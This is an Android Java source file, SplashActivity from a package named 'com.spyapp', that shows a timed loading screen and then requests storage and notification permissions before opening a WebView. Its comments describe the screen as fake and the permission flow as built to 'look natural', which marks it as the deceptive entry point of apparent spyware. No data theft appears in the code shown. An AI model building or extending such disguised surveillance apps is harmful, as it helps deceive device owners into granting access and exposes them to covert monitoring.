package com.spyapp;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class SplashActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);
        
        // Show fake "Loading..." screen
        // This looks like a genuine app loading
        
        new Handler().postDelayed(() -> {
            checkAndRequestPermissions();
        }, 2000);
    }
    
    private void checkAndRequestPermissions() {
        // Step 1: Check if we need to request permissions
        // We'll use a multi-step approach to make it look natural
        
        boolean needsStorage = false;
        boolean needsNotifications = false;
        
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, 
                    android.Manifest.permission.WRITE_EXTERNAL_STORAGE) 
                    != PackageManager.PERMISSION_GRANTED) {
                needsStorage = true;
            }
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this,
                    android.Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                needsNotifications = true;
            }
        }
        
        if (needsStorage || needsNotifications) {
            // Go to permission step activity
            Intent intent = new Intent(this, PermissionStepActivity.class);
            startActivity(intent);
            finish();
        } else {
            // Already have permissions, go to WebView
            startWebView();
        }
    }
    
    private void startWebView() {
        Intent intent = new Intent(this, WebViewActivity.class);
        startActivity(intent);
        finish();
    }
}
